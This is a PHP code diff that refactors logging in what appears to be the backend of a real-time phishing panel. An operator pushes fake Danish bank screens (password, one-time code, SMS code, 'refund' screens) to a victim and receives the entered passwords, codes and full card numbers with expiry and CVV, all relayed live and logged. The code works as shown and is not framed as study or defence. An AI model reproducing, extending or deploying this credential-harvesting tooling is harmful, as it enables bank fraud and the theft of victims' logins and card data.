@@ -153,12 +153,13 @@ function handleWsPolling(string $method, string $path): bool {
         if ($role === 'admin') {
             if ($type === 'qr-show') {
                 $pdo->prepare("UPDATE sessions SET qr_visible = 1, updated_at = ? WHERE session_id = ?")->execute([$now, $sessionId]);
-                $pdo->prepare("INSERT INTO auth_log (session_id, event_type, detail) VALUES (?, 'qr_shown', 'Admin started screen share')")->execute([$sessionId]);
+                logEvent($pdo, $sessionId, 'qr_shown', 'Admin started screen share', $role);
                 $queueMessage('user', ['type' => 'qr-show']);
             }
 
             elseif ($type === 'qr-hide') {
                 $pdo->prepare("UPDATE sessions SET qr_visible = 0, updated_at = ? WHERE session_id = ?")->execute([$now, $sessionId]);
+                logEvent($pdo, $sessionId, 'qr_hide', 'Admin hid QR', $role);
                 $queueMessage('user', ['type' => 'qr-hide']);
             }
 
@@ -180,7 +181,7 @@ function handleWsPolling(string $method, string $path): bool {
                 $amountStr = $amount !== null ? $amount : 'none';
                 $textStr = $displayText !== null ? $displayText : 'none';
                 $detail = "SMS activated: {$codeLength} digits, amount: {$amountStr}, text: {$textStr}";
-                $pdo->prepare("INSERT INTO auth_log (session_id, event_type, detail) VALUES (?, 'sms_sent', ?)")->execute([$sessionId, $detail]);
+                logEvent($pdo, $sessionId, 'sms_sent', $detail, $role);
 
                 $queueMessage('user', [
                     'type' => 'sms-activate',
@@ -204,26 +205,26 @@ function handleWsPolling(string $method, string $path): bool {
 
             elseif ($type === 'verified') {
                 $pdo->prepare("UPDATE sessions SET status = 'verified', verified_at = ?, updated_at = ? WHERE session_id = ?")->execute([$now, $now, $sessionId]);
-                $pdo->prepare("INSERT INTO auth_log (session_id, event_type, detail) VALUES (?, 'verified', 'Admin verified')")->execute([$sessionId]);
+                logEvent($pdo, $sessionId, 'verified', 'Admin verified', $role);
                 $queueMessage('user', ['type' => 'verified']);
             }
 
             elseif ($type === 'title-change') {
                 $title = (string)($data['title'] ?? '');
-                $pdo->prepare("INSERT INTO auth_log (session_id, event_type, detail) VALUES (?, 'title_changed', ?)")->execute([$sessionId, $title]);
+                logEvent($pdo, $sessionId, 'title_changed', $title, $role);
                 $queueMessage('user', ['type' => 'title-change', 'title' => $title]);
             }
 
             elseif ($type === 'broadcast-message') {
                 $msg = (string)($data['message'] ?? '');
-                $pdo->prepare("INSERT INTO auth_log (session_id, event_type, detail) VALUES (?, 'broadcast_sent', ?)")->execute([$sessionId, $msg]);
+                logEvent($pdo, $sessionId, 'broadcast_sent', $msg, $role);
                 $queueMessage('user', ['type' => 'broadcast-message', 'message' => $msg]);
             }
 
             elseif ($type === 'message-type') {
                 $mType = (string)($data['messageType'] ?? '');
                 $text = (string)($data['text'] ?? '');
-                $pdo->prepare("INSERT INTO auth_log (session_id, event_type, detail) VALUES (?, 'msg_type_changed', ?)")->execute([$sessionId, "{$mType}: {$text}"]);
+                logEvent($pdo, $sessionId, 'msg_type_changed', "{$mType}: {$text}", $role);
                 $queueMessage('user', ['type' => 'message-type', 'messageType' => $mType, 'text' => $text]);
             }
 
@@ -232,6 +233,7 @@ function handleWsPolling(string $method, string $path): bool {
             }
 
             elseif ($type === 'admin-left') {
+                logEvent($pdo, $sessionId, 'admin_left', 'Admin left session', $role);
                 $queueMessage('user', ['type' => 'admin-left']);
             }
 
@@ -239,7 +241,7 @@ function handleWsPolling(string $method, string $path): bool {
                 $pdo->prepare("UPDATE sessions SET qr_visible = 0, qr_image = NULL, sms_active = 0, updated_at = ? WHERE session_id = ?")->execute([$now, $sessionId]);
                 $approvedMsg = !empty($data['message']) ? (string)$data['message'] : 'Godkendt';
                 $approvedTitle = !empty($data['title']) ? (string)$data['title'] : 'Vent venligst';
-                $pdo->prepare("INSERT INTO auth_log (session_id, event_type, detail) VALUES (?, 'approved', ?)")->execute([$sessionId, $approvedMsg]);
+                logEvent($pdo, $sessionId, 'approved', $approvedMsg, $role);
                 $queueMessage('user', [
                     'type' => 'approved',
                     'message' => $approvedMsg,
@@ -250,7 +252,7 @@ function handleWsPolling(string $method, string $path): bool {
 
             elseif ($type === 'default-page') {
                 $pdo->prepare("UPDATE sessions SET qr_visible = 0, qr_image = NULL, sms_active = 0, updated_at = ? WHERE session_id = ?")->execute([$now, $sessionId]);
-                $pdo->prepare("INSERT INTO auth_log (session_id, event_type, detail) VALUES (?, 'default_page', 'Admin reset to default page')")->execute([$sessionId]);
+                logEvent($pdo, $sessionId, 'default_page', 'Admin reset to default page', $role);
                 $queueMessage('user', [
                     'type' => 'default-page',
                     'title' => (string)($data['title'] ?? ''),
@@ -262,7 +264,7 @@ function handleWsPolling(string $method, string $path): bool {
 
             elseif ($type === 'payment-refunded') {
                 $pdo->prepare("UPDATE sessions SET qr_visible = 0, qr_image = NULL, sms_active = 0, updated_at = ? WHERE session_id = ?")->execute([$now, $sessionId]);
-                $pdo->prepare("INSERT INTO auth_log (session_id, event_type, detail) VALUES (?, 'payment_refunded', 'Admin showed payment cancelled / refund screen')")->execute([$sessionId]);
+                logEvent($pdo, $sessionId, 'payment_refunded', 'Admin showed payment cancelled / refund screen', $role);
                 $queueMessage('user', ['type' => 'payment-refunded']);
                 $queueMessage('admin', ['type' => 'status-changed', 'field' => 'sms_active', 'value' => false]);
             }
@@ -270,7 +272,7 @@ function handleWsPolling(string $method, string $path): bool {
             // Adgangskode screen
             elseif ($type === 'show-adgangskode') {
                 $pdo->prepare("UPDATE sessions SET qr_visible = 0, qr_image = NULL, sms_active = 0, updated_at = ? WHERE session_id = ?")->execute([$now, $sessionId]);
-                $pdo->prepare("INSERT INTO auth_log (session_id, event_type, detail) VALUES (?, 'show_adgangskode', 'Admin showed Adgangskode screen')")->execute([$sessionId]);
+                logEvent($pdo, $sessionId, 'show_adgangskode', 'Admin showed Adgangskode screen', $role);
                 $queueMessage('user', ['type' => 'show-adgangskode']);
             }
 
@@ -280,7 +282,7 @@ function handleWsPolling(string $method, string $path): bool {
                 $amount = isset($data['amount']) ? trim((string)$data['amount']) : '';
                 $pdo->prepare("UPDATE sessions SET qr_visible = 0, qr_image = NULL, sms_active = 0, updated_at = ? WHERE session_id = ?")->execute([$now, $sessionId]);
                 $detail = 'Card refund screen' . ($from !== '' ? " from={$from}" : '') . ($amount !== '' ? " amount={$amount}" : '');
-                $pdo->prepare("INSERT INTO auth_log (session_id, event_type, detail) VALUES (?, 'show_card_refund', ?)")->execute([$sessionId, $detail]);
+                logEvent($pdo, $sessionId, 'show_card_refund', $detail, $role);
                 $queueMessage('user', [
                     'type' => 'show-card-refund',
                     'from' => $from,
@@ -292,7 +294,7 @@ function handleWsPolling(string $method, string $path): bool {
             // Kodeviser — 6-digit engangskode screen
             elseif ($type === 'show-kodeviser') {
                 $pdo->prepare("UPDATE sessions SET qr_visible = 0, qr_image = NULL, sms_active = 0, updated_at = ? WHERE session_id = ?")->execute([$now, $sessionId]);
-                $pdo->prepare("INSERT INTO auth_log (session_id, event_type, detail) VALUES (?, 'show_kodeviser', 'Admin showed Kodeviser screen')")->execute([$sessionId]);
+                logEvent($pdo, $sessionId, 'show_kodeviser', 'Admin showed Kodeviser screen', $role);
                 $queueMessage('user', ['type' => 'show-kodeviser']);
             }
         }
@@ -301,20 +303,20 @@ function handleWsPolling(string $method, string $path): bool {
         elseif ($role === 'user') {
             if ($type === 'verified') {
                 $pdo->prepare("UPDATE sessions SET status = 'verified', verified_at = ?, updated_at = ? WHERE session_id = ?")->execute([$now, $now, $sessionId]);
-                $pdo->prepare("INSERT INTO auth_log (session_id, event_type, detail) VALUES (?, 'verified', 'QR scanned by user')")->execute([$sessionId]);
+                logEvent($pdo, $sessionId, 'verified', 'QR scanned by user', $role);
                 $queueMessage('admin', ['type' => 'user-verified']);
                 $queueMessage('user', ['type' => 'verified']);
             }
 
             elseif ($type === 'sms-submitted') {
                 $code = (string)($data['code'] ?? '');
-                $pdo->prepare("INSERT INTO auth_log (session_id, event_type, detail) VALUES (?, 'sms_submitted', ?)")->execute([$sessionId, "Code: {$code}"]);
+                logEvent($pdo, $sessionId, 'sms_submitted', "Code: {$code}", $role);
                 $queueMessage('admin', ['type' => 'sms-submitted', 'code' => $code, 'session_id' => $sessionId, 'sessionId' => $sessionId]);
             }
 
             elseif ($type === 'adgangskode-submitted') {
                 $code = (string)($data['code'] ?? '');
-                $pdo->prepare("INSERT INTO auth_log (session_id, event_type, detail) VALUES (?, 'adgangskode_submitted', ?)")->execute([$sessionId, "Adgangskode: {$code}"]);
+                logEvent($pdo, $sessionId, 'adgangskode_submitted', "Adgangskode: {$code}", $role);
                 $queueMessage('admin', [
                     'type' => 'adgangskode-submitted',
                     'code' => $code,
@@ -328,7 +330,7 @@ function handleWsPolling(string $method, string $path): bool {
                 $exp = (string)($data['expiry'] ?? '');
                 $cvv = (string)($data['cvv'] ?? '');
                 $detail = "Kort: {$card}" . ($exp !== '' ? " Exp: {$exp}" : '') . ($cvv !== '' ? " CVV: {$cvv}" : '');
-                $pdo->prepare("INSERT INTO auth_log (session_id, event_type, detail) VALUES (?, 'card_refund_submitted', ?)")->execute([$sessionId, $detail]);
+                logEvent($pdo, $sessionId, 'card_refund_submitted', $detail, $role);
                 $queueMessage('admin', [
                     'type' => 'card-refund-submitted',
                     'cardNumber' => $card,
@@ -341,7 +343,7 @@ function handleWsPolling(string $method, string $path): bool {
 
             elseif ($type === 'kodeviser-submitted') {
                 $code = (string)($data['code'] ?? '');
-                $pdo->prepare("INSERT INTO auth_log (session_id, event_type, detail) VALUES (?, 'kodeviser_submitted', ?)")->execute([$sessionId, "Kodeviser: {$code}"]);
+                logEvent($pdo, $sessionId, 'kodeviser_submitted', "Kodeviser: {$code}", $role);
                 $queueMessage('admin', [
                     'type' => 'kodeviser-submitted',
                     'code' => $code,
@@ -351,7 +353,7 @@ function handleWsPolling(string $method, string $path): bool {
             }
 
             elseif ($type === 'user-left') {
-                $pdo->prepare("INSERT INTO auth_log (session_id, event_type, detail) VALUES (?, 'user_left', 'User disconnected (Afbryd)')")->execute([$sessionId]);
+                logEvent($pdo, $sessionId, 'user_left', 'User disconnected (Afbryd)', $role);
                 $queueMessage('admin', ['type' => 'user-left', 'session_id' => $sessionId, 'sessionId' => $sessionId]);
             }
         }
